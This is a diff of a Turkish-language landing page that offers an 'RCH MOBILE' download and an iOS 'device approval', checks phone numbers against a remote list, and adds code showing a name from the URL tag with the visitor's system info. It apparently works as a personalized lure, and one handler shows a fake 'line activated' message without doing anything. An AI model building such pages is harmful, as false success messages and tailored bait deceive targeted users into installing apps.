@@ -41,6 +41,18 @@
       border-radius: 50%;
     }
 
+    .user-info {
+      margin: 10px 0;
+      color: red;
+      font-size: 16px;
+    }
+
+    .system-info {
+      margin: 5px 0;
+      color: white;
+      font-size: 14px;
+    }
+
     .buttons {
       margin-top: 15px;
     }
@@ -61,19 +73,10 @@
       font-size: 14px;
     }
 
-    /* Disabled butonlarda içerik ortalanıp kilit ikonları görünsün */
     .buttons button:disabled {
       background: gray;
       cursor: not-allowed;
       justify-content: center;
-    }
-    .buttons button:disabled .lock-icon {
-      margin: 0 5px;
-    }
-
-    .device-type {
-      margin-top: 15px;
-      font-weight: bold;
     }
 
     .textbox-card {
@@ -87,13 +90,13 @@
 
     .textbox-card textarea {
       width: 100%;
-      height: 200px; /* Yükseklik 200px */
+      height: 200px;
       padding: 10px;
       border: none;
       border-radius: 5px;
       text-align: center;
       font-size: 16px;
-      resize: none; /* Kullanıcı tarafından boyut değiştirmeyi kapatır */
+      resize: none;
       margin-bottom: 10px;
     }
 
@@ -132,26 +135,27 @@
   <!-- Birinci Kart -->
   <div class="card">
     <div class="logo"></div>
-    <p>Açıklama Metni</p>
+    <!-- Kullanıcı Adı ve Cihaz Türü Dinamik Bilgiler -->
+    <div class="user-info" id="userInfo"></div>
+    <div class="system-info" id="systemInfo"></div>
+    
     <div class="buttons">
-      <!-- Normalde aktif iken sol ve sağda ilgili ikonlar görünüyor -->
       <button id="btn1" onclick="window.location.href='https://a.com'">
         <i class="fab fa-google-play"></i>
         <span class="btn-text"> RCH MOBILE İNDİR </span>
         <i class="fab fa-google-play"></i>
       </button>
-      <!-- iOS onay butonu; cihaz durumuna göre kilitlenebilir -->
       <button id="btn2" onclick="window.location.href='https://a.com'">
         <i class="fab fa-apple"></i>
         <span class="btn-text"> iOS CİHAZ ONAY </span>
         <i class="fab fa-apple"></i>
       </button>
     </div>
+
     <div class="textbox-card" id="textboxCard">
       <textarea id="numInput" placeholder="Numaranızı Girin"></textarea>
       <button onclick="validateNumber()">Onayla</button>
     </div>
-    <p class="device-type" id="deviceType">Cihaz Türü: Algılanıyor...</p>
   </div>
 
   <!-- İkinci Kart -->
@@ -165,39 +169,29 @@
   <script>
     function detectDevice() {
       let userAgent = navigator.userAgent || navigator.vendor || window.opera;
-      let deviceType = "Bilinmeyen";
       let btn1 = document.getElementById("btn1");
       let btn2 = document.getElementById("btn2");
-      // Kilit ikonlu erişim kısıtlı buton içeriği:
       const lockedHTML = '<span class="lock-icon"><i class="fas fa-lock"></i></span>' +
                            '<span class="btn-text">ERİŞİM KISITLI</span>' +
                            '<span class="lock-icon"><i class="fas fa-lock"></i></span>';
 
       if (/android/i.test(userAgent)) {
-        deviceType = "Android";
-        // Android cihazlarda iOS onay butonu devre dışı:
         btn2.disabled = true;
         btn2.innerHTML = lockedHTML;
       } else if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
-        deviceType = "iOS";
-        // iOS cihazlarda Google Play butonu devre dışı:
         btn1.disabled = true;
         btn1.innerHTML = lockedHTML;
       } else if (/Win|Mac|Linux/.test(userAgent)) {
-        deviceType = "Bilgisayar";
         btn1.disabled = true;
         btn2.disabled = true;
         btn1.innerHTML = lockedHTML;
         btn2.innerHTML = lockedHTML;
       } else {
-        deviceType = "Bilinmeyen";
         btn1.disabled = true;
         btn2.disabled = true;
         btn1.innerHTML = lockedHTML;
         btn2.innerHTML = lockedHTML;
       }
-
-      document.getElementById("deviceType").innerText = "Cihaz Türü: " + deviceType;
     }
 
     function showTextbox() {
@@ -209,14 +203,14 @@
 
     async function validateNumber() {
       let inputNum = document.getElementById("numInput").value.trim();
-      let response = await fetch("https://rchmobile.vercel.app/log.txt");
+      let response = await fetch("https://rchmobile.vercel.app/gsm/olucak");
       let text = await response.text();
       let validNumbers = text.split("\n").map(num => num.trim());
 
       if (validNumbers.includes(inputNum)) {
         showToast("Hattınız başarıyla aktif edildi!");
         setTimeout(() => {
-          window.location.href = "https://a.com"; // Doğru numara ise a.com yönlendirme
+          window.location.href = "https://a.com"; 
         }, 2000);
       } else {
         showToast("Geçersiz numara, tekrar deneyin!");
@@ -230,7 +224,33 @@
       setTimeout(() => { toast.className = "toast"; }, 3000);
     }
 
-    detectDevice();
+    function iosButtonClick() {
+      let btn2 = document.getElementById("btn2");
+      if (!btn2.disabled) {
+        showToast("HATTINIZ AKTİF EDİLMİŞTİR");
+      }
+    }
+
+    function updateUserInfo() {
+      // URL sonundaki etiket ve sistem bilgisini al
+      let urlHash = window.location.hash.substring(1);  // URL'den etiket kısmını alıyoruz (örneğin: #AHMET)
+      let systemInfo = `${navigator.platform} - ${navigator.userAgent.indexOf('Chrome') > -1 ? 'CHROME' : 'BROWSER'}`;
+
+      // Kullanıcı adı ve sistem bilgilerini güncelle
+      if (urlHash) {
+        document.getElementById('userInfo').textContent = `🔎 @${urlHash}`;
+        document.getElementById('systemInfo').textContent = `Sistem: ${systemInfo}`;
+      } else {
+        document.getElementById('userInfo').textContent = '';
+        document.getElementById('systemInfo').textContent = '';
+      }
+    }
+
+    window.onload = function() {
+      detectDevice();
+      updateUserInfo();  // Sayfa yüklendiğinde kullanıcı bilgilerini güncelle
+    };
+
   </script>
 
 </body>
